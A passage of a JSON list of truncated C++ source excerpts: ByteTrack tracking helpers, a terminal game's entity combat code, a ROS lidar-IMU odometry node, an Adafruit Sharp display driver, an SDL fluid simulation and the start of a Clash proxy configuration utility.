pairs;\n    for (int i = 0; i < pdist.size(); i++)\n    {\n        for (int j = 0; j < pdist[i].size(); j++)\n        {\n            if (pdist[i][j] < 0.15)\n            {\n                pairs.push_back(std::pair<int, int>(i, j));\n            }\n        }\n    }\n\n    std::vector<int> dupa, dupb;\n    for (int i = 0; i < pairs.size(); i++)\n    {\n        int timep = stracksa[pairs[i].first].frame_id - stracksa[pairs[i].first].start_frame;\n        int timeq = stracksb[pairs[i].second].frame_id - stracksb[pairs[i].second].start_frame;\n        if (timep > timeq)\n            dupb.push_back(pairs[i].second);\n        else\n            dupa.push_back(pairs[i].first);\n    }\n\n    for (int i = 0; i < stracksa.size(); i++)\n    {\n        std::vector<int>::iterator iter = find(dupa.begin(), dupa.end(), i);\n        if (iter == dupa.end())\n        {\n            resa.push_back(stracksa[i]);\n        }\n    }\n\n    for (int i = 0; i < stracksb.size(); i++)\n    {\n        std::vector<int>::iterator iter = find(dupb.begin(), dupb.end(), i);\n        if (iter == dupb.end())\n        {\n            resb.push_back(stracksb[i]);\n        }\n    }\n}\n\nvoid BYTEtracker::linear_assignment(std::vector< std::vector<float> > &cost_matrix, int cost_matrix_size, int cost_matrix_size_size, float thresh,\n                                     std::vector< std::vector<int> > &matches, std::vector<int> &unmatched_a, std::vector<int> &unmatched_b)\n{\n    if (cost_matrix.size() == 0)\n    {\n        for (int i = 0; i < cost_matrix_size; i++)\n        {\n            unmatched_a.push_back(i);\n        }\n        for (int i = 0; i < cost_matrix_size_size; i++)\n        {\n            unmatched_b.push_back(i);\n        }\n        return;\n    }\n\n    std::vector<int> rowsol;  std::vector<int> colsol;\n    float c = lapjv(cost_matrix, rowsol, colsol, true, thresh);\n    for (int i = 0; i < rowsol.size(); i++)\n    {\n        if (rowsol[i] >= 0)\n        {\n            std::vector<int> match;\n            match.push_back(i);\n            match.push_back(rowsol[i]);\n            matches.push_back(match);\n        }\n        else\n        {\n            unmatched_a.push_back(i);\n        }\n    }\n\n    for (int i = 0; i < colsol.size(); i++)\n    {\n        if (colsol[i] < 0)\n        {\n            unmatched_b.push_back(i);\n        }\n    }\n}\n\nstd::vector< std::vector<float> > BYTEtracker::ious(std::vector< std::vector<float> > &atlbrs, std::vector< std::vector<float> > &btlbrs)\n{\n    std::vector< std",
    "// entities2 \u00a9 2024 by norbcodes is licensed under CC BY-NC 4.0\n\n#include <iostream>\n#include <cstdint>\n#include <string>\n#include <vector>\n#include <math.h>\n\n#include \"energy_constants.hpp\"\n#include \"entity_constants.hpp\"\n#include \"status_constants.hpp\"\n#include \"colors.hpp\"\n#include \"entity.hpp\"\n#include \"utils.hpp\"\n#include \"rng.hpp\"\n\nEntity::Entity(int32_t start_health, int32_t start_armor) : health(start_health), armor(start_armor), energy(STARTING_ENERGY)\n{\n    this->status_list.reserve(64);\n}\n\nint32_t Entity::GetHealth() const\n{\n    return this->health;\n}\n\nint32_t Entity::GetArmor() const\n{\n    return this->armor;\n}\n\nvoid Entity::Hurt(uint32_t dmg)\n{\n    if ((this->health - dmg) <= 0)\n    {\n        this->health = 0;\n        return;\n    }\n    this->health -= dmg;\n}\n\nvoid Entity::HurtArmor(uint32_t dmg)\n{\n    if ((this->armor - dmg) <= 0)\n    {\n        this->armor = 0;\n        return;\n    }\n    this->armor -= dmg;\n}\n\nvoid Entity::Heal(uint32_t val)\n{\n    if ((this->health + val) >= MAX_STAT_CAP)\n    {\n        this->health = MAX_STAT_CAP;\n        return;\n    }\n    this->health += val;\n}\n\nvoid Entity::RegenArmor(uint32_t val)\n{\n    if ((this->armor + val) >= MAX_STAT_CAP)\n    {\n        this->armor = MAX_STAT_CAP;\n        return;\n    }\n    this->armor += val;\n}\n\n////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////////////\n\nvoid PrintEntityStats(const Entity& ent)\n{\n    std::cout << GREEN(BOLD_IN(\"HP: \")) << WHITE(std::to_string(ent.GetHealth())) << PINK(BOLD_IN(\" AR: \")) << WHITE(std::to_string(ent.GetArmor()));\n    std::cout << GOLD(BOLD_IN(\"\\tS: \"));\n    for (int i = 0; i != ent.StatusCount(); i++)\n    {\n        Status _s = ent.GetStatusAt(i);\n        if (_s.GetType() == AUTO_HEAL)\n        {\n            std::cout << GREEN(\"+\") << DARK_GRAY(std::to_string((int)_s.GetTimeLeft())) << \" \";\n        }\n        else if (_s.GetType() == INCR_CRIT)\n        {\n            std::cout << RED(\"X\") << DARK_GRAY(std::to_string((int)_s.GetTimeLeft())) << \" \";\n        }\n        else if (_s.GetType() == INVIS)\n        {\n            std::cout << WHITE(\"O\") << DARK_GRAY(std::to_string((int)_s.GetTimeLeft())) << \" \";\n        }\n        else if (_s.GetType() == POISON)\n        {\n            std::cout << DARK_GREEN(\"P\") << DARK_GRAY(std::to_string((int)_s.GetTimeLeft())) << \" \";\n        }\n    }\n    std::cout << std::endl;\n}\n\nvoid EntityAttack(const Entity& attacker, Entity& victim, uint32_t dmg, std::string& msg, bool enemy_turn)\n{\n    // if victim has invis\n    if (victim.StatusActive(INVIS) && rng(0, 100) > 80)\n    {\n        if (enemy_turn)\n        {\n            msg += RED(BOLD_IN(\"Enemy \")) + WHITE(\"tried to attack, but \") + WHITE(ITALIC_IN(\"missed\")) + WHITE(\"!\");\n        }\n        else\n        {\n            msg += BLUE(BOLD_IN(\"Player \")) + WHITE(\"tried to attack, but \") + WHITE(ITALIC_IN(\"missed\")) + WHITE(\"!\");\n        }\n        return;\n    }\n\n    uint32_t health_dmg = dmg;\n    uint32_t armor_dmg = 0;\n    bool crit_flag = false;\n    // Crit\n    if (attacker.StatusActive(INCR_CRIT) && rng(0, 100) > 70)\n    {\n        health_dmg *= 2;\n        crit_flag = true;\n    }\n    // If victim has armor, we split health_dmg\n    if (victim.GetArmor() != 0)\n    {\n        uint8_t _temp = health_dmg;\n        health_dmg = (uint32_t)(ceilf(health_dmg / 2));\n        armor_dmg = (uint32_t)(floorf(_temp / 2));\n    }\n    // IF armor_dmg takes more armor than the victim has (armor < 0) then do this\n    if (armor_dmg > victim.GetArmor())\n    {\n        health_dmg += armor_dmg - victim.GetArmor();\n        armor_dmg = victim.GetArmor();\n    }\n\n    victim.Hurt(health_dmg);\n    victim.HurtArmor(armor_dmg);\n\n    if (!enemy_turn)\n    {\n        if (!crit_flag)\n        {\n            msg += BLUE(BOLD_IN(\"Player \")) + WHITE(\"has attacked \") + RED(BOLD_IN(\"Enemy\")) + WHITE(\"! \") + RED(BOLD_IN(\"Enemy \")) + PURPLE(\"-\" + std::to_string(health_dmg)) + WHITE(\" HP \") + ((armor_dmg != 0) ? (PURPLE(\"-\" + std::to_string(armor_dmg)) + WHITE(\" AR\")) : WHITE(\"\"));\n            return;\n        }\n        msg += BLUE(BOLD_IN(\"Player \")) + WHITE(\"has attacked \") + RED(BOLD_IN(\"Enemy\")) + WHITE(\"! \") + GOLD(ITALIC_IN(\"CRITICAL HIT\")) + WHITE(\"! \") + RED(BOLD_IN(\"Enemy \")) + PURPLE(\"-\" + std::to_string(health_dmg)) + WHITE(\" HP \") + ((armor_dmg != 0) ? (PURPLE(\"-\" + std::to_string(armor_dmg)) + WHITE(\" AR\")) : WHITE(\"\"));\n        return;\n    }\n    else\n    {\n        if (!crit_flag)\n        {\n            msg += RED(BOLD_IN(\"Enemy \")) + WHITE(\"has attacked \") + BLUE(BOLD_IN(\"Player\")) + WHITE(\"! \") + BLUE(BOLD_IN(\"Player \")) + PURPLE(\"-\" + std::to_string(health_dmg",
    "#include <omp.h>\n#include <mutex>\n#include <math.h>\n#include <thread>\n#include <fstream>\n#include <csignal>\n#include <unistd.h>\n#include <ros/ros.h>\n#include <Eigen/Core>\n#include <nav_msgs/Odometry.h>\n#include <nav_msgs/Path.h>\n#include <visualization_msgs/Marker.h>\n#include <pcl_conversions/pcl_conversions.h>\n#include <pcl/point_cloud.h>\n#include <pcl/point_types.h>\n#include <pcl/filters/voxel_grid.h>\n#include <pcl/io/pcd_io.h>\n#include <sensor_msgs/PointCloud2.h>\n#include <tf/transform_datatypes.h>\n#include <tf/transform_broadcaster.h>\n#include <geometry_msgs/Vector3.h>\n#include <livox_ros_driver/CustomMsg.h>\n#include \"preprocess.h\"\n#include <ikd-Tree/ikd_Tree.h>\n\n#include \"IMU_Processing.hpp\"\n\n#define INIT_TIME (0.1)\n#define LASER_POINT_COV (0.001)\n#define PUBFRAME_PERIOD (20)\n\n/*** Time Log Variables ***/\nint add_point_size = 0, kdtree_delete_counter = 0;\nbool pcd_save_en = false, time_sync_en = false, extrinsic_est_en = true, path_en = true;\n/**************************/\n\nfloat res_last[100000] = {0.0};\nfloat DET_RANGE = 300.0f;\nconst float MOV_THRESHOLD = 1.5f;\ndouble time_diff_lidar_to_imu = 0.0;\n\nmutex mtx_buffer;\ncondition_variable sig_buffer;            //\u6761\u4ef6\u53d8\u91cf\uff08condition_variable\uff09\u662f C++ \u4e2d\u7528\u4e8e\u591a\u7ebf\u7a0b\u540c\u6b65\u7684\u4e00\u79cd\u673a\u5236\u3002\u5b83\u901a\u5e38\u4e0e\u4e92\u65a5\u9501\uff08mutex\uff09\u4e00\u8d77\u4f7f\u7528\uff0c\u7528\u4e8e\u5b9e\u73b0\u7ebf\u7a0b\u95f4\u7684\u7b49\u5f85\u548c\u901a\u77e5\u673a\u5236\u3002\nros::Publisher pubLaserCloudMap;\n\nstring root_dir = ROOT_DIR;\nstring map_file_path, lid_topic, imu_topic;\n\ndouble last_timestamp_lidar = 0, last_timestamp_imu = -1.0;\ndouble gyr_cov = 0.1, acc_cov = 0.1, b_gyr_cov = 0.0001, b_acc_cov = 0.0001;\ndouble filter_size_corner_min = 0, filter_size_surf_min = 0, filter_size_map_min = 0, fov_deg = 0;\ndouble cube_len = 0, lidar_end_time = 0, first_lidar_time = 0.0;\nint scan_count = 0, publish_count = 0;\nint feats_down_size = 0, NUM_MAX_ITERATIONS = 0, pcd_index = 0;\n\nbool lidar_pushed, flg_first_scan = true, flg_exit = false, flg_EKF_inited;\nbool scan_pub_en = false, dense_pub_en = false, scan_body_pub_en = false;\n\nvector<BoxPointType> cub_needrm;\nvector<PointVector> Nearest_Points;\nvector<double> extrinT(3, 0.0);\nvector<double> extrinR(9, 0.0);\nvector<double> init_pos(3, 0.0);\nvector<double> init_rot{0, 0, 0, 1};\ndeque<double> time_buffer;\ndeque<PointCloudXYZI::Ptr> lidar_buffer;\ndeque<sensor_msgs::Imu::ConstPtr> imu_buffer;\n\nPointCloudXYZI::Ptr featsFromMap(new PointCloudXYZI());\nPointCloudXYZI::Ptr feats_undistort(new PointCloudXYZI());\nPointCloudXYZI::Ptr feats_down_body(new PointCloudXYZI());  //\u7578\u53d8\u7ea0\u6b63\u540e\u964d\u91c7\u6837\u7684\u5355\u5e27\u70b9\u4e91\uff0clidar\u7cfb\nPointCloudXYZI::Ptr feats_down_world(new PointCloudXYZI()); //\u7578\u53d8\u7ea0\u6b63\u540e\u964d\u91c7\u6837\u7684\u5355\u5e27\u70b9\u4e91\uff0cW\u7cfb\nPointCloudXYZI::Ptr cloud(new PointCloudXYZI());\n\npcl::VoxelGrid<PointType> downSizeFilterSurf;\npcl::VoxelGrid<PointType> downSizeFilterMap;\n\nKD_TREE<PointType> ikdtree;\n\nV3D Lidar_T_wrt_IMU(Zero3d);\nM3D Lidar_R_wrt_IMU(Eye3d);\n\n/*** EKF inputs and output ***/\nMeasureGroup Measures;\n\nesekfom::esekf kf;                                                    //\u5b58\u50a8\u6211\u4eec\u5f85\u4f18\u5316\u7684\u72b6\u6001\u91cf\n\nstate_ikfom state_point;\nEigen::Vector3d pos_lid; //\u4f30\u8ba1\u7684W\u7cfb\u4e0b\u7684\u4f4d\u7f6e\n\nnav_msgs::Path path;\nnav_msgs::Odometry odomAftMapped;\ngeometry_msgs::PoseStamped msg_body_pose;\n\nshared_ptr<Preprocess> p_pre(new Preprocess());\n\nvoid SigHandle(int sig)\n{\n    flg_exit = true;\n    ROS_WARN(\"catch sig %d\", sig);        //\u540c\u65f6\uff0c\u901a\u8fc7\u8c03\u7528 notify_all() \u6765\u901a\u77e5\u5176\u4ed6\u7ebf\u7a0b\u6216\u8005\u6761\u4ef6\u53d8\u91cf\uff0c\u4ee5\u89e6\u53d1\u76f8\u5e94\u7684\u540e\u7eed\u5904\u7406\u3002\n    sig_buffer.notify_all();              //\u4e00\u4e2a ROS \u8282\u70b9\u4e2d\u7528\u4e8e\u5904\u7406\u4fe1\u53f7\uff0c\u5f53\u63a5\u6536\u5230\u7279\u5b9a\u4fe1\u53f7\u65f6\uff0c\u8bbe\u7f6e\u9000\u51fa\u6807\u8bb0\u5e76\u8f93\u51fa\u65e5\u5fd7\u3002\n\n\n}\n\nvoid standard_pcl_cbk(const sensor_msgs::PointCloud2::ConstPtr &msg)         //\u6bcf\u4e00\u4e2ascan\u7684\u70b9\u4e91\n{\n    mtx_buffer.lock();                                                       //\u5148\u9501\u4e0a\uff0c\u9632\u6b62\u5176\u4ed6\u7ebf\u7a0b\u8c03\u7528\n    scan_count++;                                                            //\u8ba1\u6570\u52a0\u4e00\n    double preprocess_start_time = omp_get_wtime();\n    if (msg->header.stamp.toSec() < last_timestamp_lidar)\n    {\n        ROS_ERROR(\"lidar loop back, clear buffer\");\n        lidar_buffer.clear();\n    }\n\n    PointCloudXYZI::Ptr ptr(new PointCloudXYZI());\n    p_pre->process(msg, ptr);                                               //\u628amsg\u7ecf\u8fc7process\u5904\u7406\uff0c\u8f6c\u5316\u4e3apcl\u7c7b\u578b\u7684\u70b9\u4e91 ptr\u5373\u5904\u7406\u597d\u7684\u70b9\u4e91\n    lidar_buffer.push_back(ptr);                                            //ptr\u5373pl_surf[128]\n    time_buffer.push_back(msg->header.stamp.toSec());                       //\u65f6\u95f4\u6233buff\n    last_timestamp_lidar = msg->header.stamp.toSec();\n    mtx_buffer.unlock();                                                    //\u591a\u7ebf\u7a0b\u89e3\u9501\n    sig_buffer.notify_all();                                                //\u5524\u9192\u5176\u4ed6\u7ebf\u7a0b\n}\n\ndouble timediff_lidar_wrt_imu = 0.0;\nbool timediff_set_flg = false;\nvoid livox_pcl_cbk(const livox_ros_driver::CustomMsg::ConstPtr &msg)\n{\n    mtx_buffer.lock();\n    double preprocess_start_time = omp_get_wtime();\n    scan_count++;\n    if (msg->header.stamp.toSec() < last_timestamp_lidar)\n    {\n        ROS_ERROR(\"lidar loop back, clear buffer\");\n        lidar_buffer.clear();\n    }\n    last_timestamp_lidar = msg->header.stamp.toSec();\n\n    if (!time_sync_en && abs(last_timestamp_imu - last_timestamp_lidar) > 10.0 && !imu_buffer.empty() && !lidar_buffer.empty())\n    {\n        printf(\"IMU and LiDAR not Synced, IMU time",
    "/*********************************************************************\nModified by Reinout Roels to support the Sharp LS018B7DH02\n*********************************************************************/\n/*********************************************************************\nThis is an Arduino library for our Monochrome SHARP Memory Displays\n\n  Pick one up today in the adafruit shop!\n  ------> http://www.adafruit.com/products/1393\n\nThese displays use SPI to communicate, 3 pins are required to\ninterface\n\nAdafruit invests time and resources providing this open source code,\nplease support Adafruit and open-source hardware by purchasing\nproducts from Adafruit!\n\nWritten by Limor Fried/Ladyada  for Adafruit Industries.\nBSD license, check license.txt for more information\nAll text above, and the splash screen must be included in any redistribution\n*********************************************************************/\n\n#include \"Adafruit_SharpMem.h\"\n\n#ifndef _swap_int16_t\n#define _swap_int16_t(a, b)                                                    \\\n  {                                                                            \\\n    int16_t t = a;                                                             \\\n    a = b;                                                                     \\\n    b = t;                                                                     \\\n  }\n#endif\n#ifndef _swap_uint16_t\n#define _swap_uint16_t(a, b)                                                   \\\n  {                                                                            \\\n    uint16_t t = a;                                                            \\\n    a = b;                                                                     \\\n    b = t;                                                                     \\\n  }\n#endif\n\n/**************************************************************************\n    Sharp Memory Display Connector\n    -----------------------------------------------------------------------\n    Pin   Function        Notes\n    ===   ==============  ===============================\n      1   VIN             3.3-5.0V (into LDO supply)\n      2   3V3             3.3V out\n      3   GND\n      4   SCLK            Serial Clock\n      5   MOSI            Serial Data Input\n      6   CS              Serial Chip Select\n      9   EXTMODE         COM Inversion Select (Low = SW clock/serial)\n      7   EXTCOMIN        External COM Inversion Signal\n      8   DISP            Display On(High)/Off(Low)\n\n **************************************************************************/\n\n#define TOGGLE_VCOM                                                            \\\n  do {                                                                         \\\n    _sharpmem_vcom = _sharpmem_vcom ? 0x00 : SHARPMEM_BIT_VCOM;                \\\n  } while (0);\n\n/**\n * @brief Construct a new Adafruit_SharpMem object with software SPI\n *\n * @param clk The clock pin\n * @param mosi The MOSI pin\n * @param cs The display chip select pin - **NOTE** this is ACTIVE HIGH!\n * @param width The display width\n * @param height The display height\n * @param freq The SPI clock frequency desired (unlikely to be that fast in soft\n * spi mode!)\n */\nAdafruit_SharpMem::Adafruit_SharpMem(uint8_t clk, uint8_t mosi, uint8_t cs,\n                                     uint16_t width, uint16_t height,\n                                     uint32_t freq)\n    : Adafruit_GFX(width, height) {\n  _cs = cs;\n  if (spidev) {\n    delete spidev;\n  }\n  spidev =\n      new Adafruit_SPIDevice(cs, clk, -1, mosi, freq, SPI_BITORDER_LSBFIRST);\n}\n\n/**\n * @brief Construct a new Adafruit_SharpMem object with hardware SPI\n *\n * @param theSPI Pointer to hardware SPI device you want to use\n * @param cs The display chip select pin - **NOTE** this is ACTIVE HIGH!\n * @param width The display width\n * @param height The display height\n * @param freq The SPI clock frequency desired\n */\nAdafruit_SharpMem::Adafruit_SharpMem(SPIClass *theSPI, uint8_t cs,\n                                     uint16_t width, uint16_t height,\n                                     uint32_t freq)\n    : Adafruit_GFX(width, height) {\n  _cs = cs;\n  if (spidev) {\n    delete spidev;\n  }\n  spidev = new Adafruit_SPIDevice(cs, freq, SPI_BITORDER_LSBFIRST, SPI_MODE0,\n                                  theSPI);\n}\n\n/**\n * @brief Start the driver object, setting up pins and configuring a buffer for\n * the screen contents\n *\n * @return boolean true: success false: failure\n */\nboolean Adafruit_SharpMem::begin(void) {\n  if (!spidev->begin()) {\n    return false;\n  }\n  // this display is weird in that _cs is active HIGH not LOW like every other\n  // SPI device\n  digitalWrite(_cs, LOW);\n\n  // Set the vcom bit to a defined state\n  _sharpmem_vcom = SHARPMEM_BIT_VCOM;\n\n  sharpmem_buffer = (uint8_t *)malloc((SHARP_BUFFER_WIDTH * HEIGHT) / 8);\n\n  if (!sharpmem_buffer)\n    return false;\n\n  setRotation(0);\n\n  return true;\n}\n\n// 1<<n is a costly operation on AVR -- table usu. sm",
    "#include <SDL.h>\r\n#include <SDL_opengl.h>\r\n#include <vector>\r\n#include <cmath>\r\n#include <iostream>\r\n#include <random>\r\n#include <string>\r\n#include <algorithm>\r\n#include <thread>\r\n#include <mutex>\r\n#include <immintrin.h> // \u0414\u043b\u044f SIMD \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0439\r\n\r\n// \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 \r\nconst int WIDTH = 770;\r\nconst int HEIGHT = 500;\r\nconst int FPS = 5000;\r\nconst int PARTICLE_RADIUS = 5;\r\nfloat GRAVITY = 0.0981f;\r\nfloat REST_DENSITY = 10.0f;\r\nfloat GAS_CONSTANT = 2.0f;\r\nfloat VISCOSITY = 0.9f;\r\nint PARTICLE_CREATION_RATE = 100;\r\nfloat COHESION_STRENGTH = 0.2f;\r\nfloat DAMPING = 0.99f;\r\nfloat DRAG_COEFFICIENT = 0.1f;\r\nconst int GRAB_RADIUS = 50;\r\nfloat SPRING_CONSTANT = 0.2f;\r\nconst int MAX_PARTICLES = 9000; // \u041e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u0435 \u043d\u0430 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0447\u0430\u0441\u0442\u0438\u0446\r\nfloat ROTATION_SPEED = 20.0f; // \u0421\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u0432\u0440\u0430\u0449\u0435\u043d\u0438\u044f \u0447\u0430\u0441\u0442\u0438\u0446\r\nint IMPULSE_STRENGTH = 50; // \u0421\u0438\u043b\u0430 \u0438\u043c\u043f\u0443\u043b\u044c\u0441\u0430 (\u0442\u0435\u043f\u0435\u0440\u044c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f)\r\n\r\n#define DEG2RAD 0.017453292519943295f // PI / 180\r\n\r\n\r\n// \u041f\u0440\u0435\u043f\u044f\u0442\u0441\u0442\u0432\u0438\u0435\r\nconst int OBSTACLE_X = 200;\r\nconst int OBSTACLE_Y = 200;\r\nconst int OBSTACLE_RADIUS = 0;\r\n\r\n// \u0421\u0442\u0435\u043d\u044b\r\nconst int WALL_THICKNESS = 0;\r\nconst SDL_Color WALL_COLOR = { 255, 255, 255, 255 };\r\nconst int PAD_X = 240;\r\nconst int PAD_Y = 20;\r\n\r\n// \u0413\u0440\u0430\u0434\u0438\u0435\u043d\u0442 \u0446\u0432\u0435\u0442\u043e\u0432\r\nconst int GRADIENT_STEPS = 4096;\r\nSDL_Color color_gradient[GRADIENT_STEPS];\r\nconst float max_speed = 16.0f;\r\n\r\n// \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u0442\u043e\u043a\u043e\u0432\r\nconst int NUM_THREADS = std::thread::hardware_concurrency();\r\n\r\n// \u041c\u044c\u044e\u0442\u0435\u043a\u0441 \u0434\u043b\u044f \u0441\u0438\u043d\u0445\u0440\u043e\u043d\u0438\u0437\u0430\u0446\u0438\u0438 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 \u043a particles\r\nstd::mutex particles_mutex;\r\n\r\n// \u0424\u043b\u0430\u0433 \u0434\u043b\u044f \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0441\u0442\u0440\u0435\u043b\u043e\u043a\r\nbool show_arrows = false;\r\n\r\n// \u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u044f \u0434\u0435\u0431\u0430\u0433-\u043c\u0435\u043d\u044e\r\nbool debug_mode = false;\r\n\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0433\u0440\u0430\u0434\u0438\u0435\u043d\u0442\u0430 \u0446\u0432\u0435\u0442\u043e\u0432\r\nvoid create_gradient(SDL_Color color1, SDL_Color color2, int steps, SDL_Color* gradient) {\r\n    for (int i = 0; i < steps; ++i) {\r\n        float t = i / (steps - 1.0f);\r\n        gradient[i].r = static_cast<Uint8>(color1.r * (1 - t) + color2.r * t);\r\n        gradient[i].g = static_cast<Uint8>(color1.g * (1 - t) + color2.g * t);\r\n        gradient[i].b = static_cast<Uint8>(color1.b * (1 - t) + color2.b * t);\r\n        gradient[i].a = 255;\r\n    }\r\n}\r\n\r\n// \u041a\u043b\u0430\u0441\u0441 \u0447\u0430\u0441\u0442\u0438\u0446\u044b\r\nclass Particle {\r\npublic:\r\n    float x;\r\n    float y;\r\n    float vx;\r\n    float vy;\r\n    float density;\r\n    float pressure;\r\n    float angle; // \u0423\u0433\u043e\u043b \u043f\u043e\u0432\u043e\u0440\u043e\u0442\u0430\r\n    float angular_velocity; // \u0423\u0433\u043b\u043e\u0432\u0430\u044f \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u044c\r\n    std::vector<Particle*> near_particles;\r\n    bool grabbed;\r\n\r\n    Particle(float x, float y) : x(x), y(y), vx(0), vy(0), density(0), pressure(0), angle(0), angular_velocity(0), grabbed(false) {}\r\n\r\n    void update() {\r\n        vy += GRAVITY;\r\n        x += vx;\r\n        y += vy;\r\n\r\n        // \u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u0432\u0440\u0430\u0449\u0435\u043d\u0438\u044f\r\n        angle += angular_velocity;\r\n\r\n        // \u0421\u0442\u043e\u043b\u043a\u043d\u043e\u0432\u0435\u043d\u0438\u044f \u0441 \u0433\u0440\u0430\u043d\u0438\u0446\u0430\u043c\u0438 (\u043e\u043f\u0442\u0438\u043c\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u043d\u043e)\r\n        if (x < PARTICLE_RADIUS + PAD_X) {\r\n            x = PARTICLE_RADIUS + PAD_X;\r\n            vx *= -0.7f;\r\n        }\r\n        else if (x > WIDTH - PARTICLE_RADIUS - PAD_X) {\r\n            x = WIDTH - PARTICLE_RADIUS - PAD_X;\r\n            vx *= -0.7f;\r\n        }\r\n\r\n        if (y > HEIGHT - PARTICLE_RADIUS - PAD_Y) {\r\n            y = HEIGHT - PARTICLE_RADIUS - PAD_Y;\r\n            vy *= -0.7f;\r\n        }\r\n\r\n        // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u043e \u0443\u0441\u043b\u043e\u0432\u0438\u0435 \u0434\u043b\u044f \u0432\u0435\u0440\u0445\u043d\u0435\u0439 \u0433\u0440\u0430\u043d\u0438\u0446\u044b\r\n        if (y < PARTICLE_RADIUS + PAD_Y) {\r\n            y = PARTICLE_RADIUS + PAD_Y;\r\n            vy *= -0.7f;\r\n        }\r\n\r\n        // \u0421\u0442\u043e\u043b\u043a\u043d\u043e\u0432\u0435\u043d\u0438\u0435 \u0441 \u043f\u0440\u0435\u043f\u044f\u0442\u0441\u0442\u0432\u0438\u0435\u043c (\u043e\u043f\u0442\u0438\u043c\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u043d\u043e)\r\n        float dx = x - OBSTACLE_X;\r\n        float dy = y - OBSTACLE_Y;\r\n        float distance_to_obstacle_sq = dx * dx + dy * dy;\r\n        float radius_sum_sq = (PARTICLE_RADIUS + OBSTACLE_RADIUS) * (PARTICLE_RADIUS + OBSTACLE_RADIUS);\r\n\r\n        if (distance_to_obstacle_sq < radius_sum_sq) {\r\n            float distance_to_obstacle = std::sqrt(distance_to_obstacle_sq);\r\n            float overlap = (PARTICLE_RADIUS + OBSTACLE_RADIUS) - distance_to_obstacle;\r\n            x += overlap * dx / distance_to_obstacle;\r\n            y += overlap * dy / distance_to_obstacle;\r\n            vx *= -0.7f;\r\n            vy *= -0.7f;\r\n        }\r\n\r\n        // \u0414\u0435\u043c\u043f\u0444\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u0438\r\n        vx *= DAMPING;\r\n        vy *= DAMPING;\r\n    }\r\n\r\n    void draw() {\r\n        // \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0433\u0440\u0430\u0434\u0438\u0435\u043d\u0442\u0430 \u0434\u043b\u044f \u0432\u0438\u0437\u0443\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u0438\r\n        float speed = std::sqrt(vx * vx + vy * vy);\r\n        int colorIndex = static_cast<int>(speed / max_speed * (GRADIENT_STEPS - 1));\r\n        colorIndex = std::min(colorIndex, GRADIENT_STEPS - 1);\r\n\r\n        // \u0420\u0438\u0441\u043e\u0432\u0430\u043d\u0438\u0435 \u043a\u0440\u0443\u0433\u0430 \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e OpenGL\r\n        glEnable(GL_BLEND);\r\n        glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);\r\n\r\n        glColor4ub(color_gradient[colorIndex].r, color_gradient[colorIndex].g, color_gradient[colorIndex].b, 128);\r\n        glBegin(GL_POLYGON);\r\n\r\n        // \u0412\u044b\u0431\u043e\u0440 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0430 \u0441\u0435\u0433\u043c\u0435\u043d\u0442\u043e\u0432 \u0432 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438 \u043e\u0442 debug_mode\r\n        int num_segments = debug_mode ? 0 : 32;\r\n\r\n        for (int i = 0; i < num_segments; i++) {\r\n            float degInRad = i * 2 * M_PI / num_segments;\r\n            glVertex2f(x + cos(degInRad) * PARTICLE_RADIUS, y + sin(degInRad) * PARTICLE_RADIUS);\r\n  ",
    "\ufeff#include <iostream>\n#include <fstream>\n#include <string>\n#include <cstdlib>\n#include <regex>\n#include <stdexcept>\n#include <array>\n#include <memory>\n\n/*\n    \u5907\u5fd8\uff1a\n    port\u662f\u81ea\u52a8\u83b7\u53d6\uff0c\u4e3b\u673aclash\u914d\u7f6e\u6587\u4ef6\u81ea\u52a8\u4fee\u6539\n    Linux \u914d\u7f6e\u6587\u4ef6\u5b58\u50a8\u5728 nano ~/.bashrc\n    \u9700\u8981\u624b\u52a8\u83b7\u53d6\u586b\u5199\u865a\u62df\u673a\u9759\u6001\u7f51\u7edc\u73af\u5883\u914d\u7f6e ip addr show\n    \u9700\u8981\u624b\u52a8\u586b\u5199clash config\u8def\u5f84\uff0c\u865a\u62df\u673a\u7528\u6237\u540d\n*/\n\nconst std::string PATH_TO_CLASH_CONFIG_YAML = \"C:/Users/25087/.config/clash/config.yaml\";\nconst std::string VM_IP_ADDR = \"192.168.1.7\";\nconst std::string VM_USERNAME = \"cs180\";\n\n// \u4f20\u5165cmd\u547d\u4ee4\uff0c\u57fa\u4e8e\u7ba1\u9053\u901a\u4fe1\uff0c\u4e4b\u540e\u8fd4\u56de\u6267\u884c\u8f93\u51fa\u7ed3\u679c\n// 